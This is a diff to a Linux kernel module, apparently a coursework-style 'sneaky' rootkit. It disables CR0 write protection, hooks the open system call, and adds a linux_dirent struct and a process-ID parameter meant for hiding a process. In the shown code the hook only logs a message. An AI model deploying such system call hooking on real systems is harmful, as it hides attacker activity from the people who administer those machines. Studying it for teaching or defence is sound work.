@@ -15,6 +15,19 @@
 //so that we can change the read/write permissions of kernel pages.
 #define read_cr0() (native_read_cr0())
 #define write_cr0(x) (native_write_cr0(x))
+#define BUFFLEN 1024
+
+struct linux_dirent {
+  u64 d_ino;
+  s64 d_off;
+  unsigned short d_reclen;
+  char d_name[BUFFLEN];
+};
+
+//process ID
+char* pid = "";
+module_param(pid, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
+MODULE_PARM_DESC(pid, "Sneaky Process ID");
 
 //These are function pointers to the system calls that change page
 //permissions for the given address (page) to read-only or read-write.
@@ -39,6 +52,8 @@ asmlinkage int (*original_call)(const char *pathname, int flags);
 asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 {
   printk(KERN_INFO "Very, very Sneaky!\n");
+  
+  
   return original_call(pathname, flags);
 }
 
@@ -50,7 +65,7 @@ static int initialize_sneaky_module(void)
 
   //See /var/log/syslog for kernel print output
   printk(KERN_INFO "Sneaky module being loaded.\n");
-
+  printk(KERN_INFO "Process ID is %s.\n",pid);
   //Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
   //Get a pointer to the virtual page containing the address
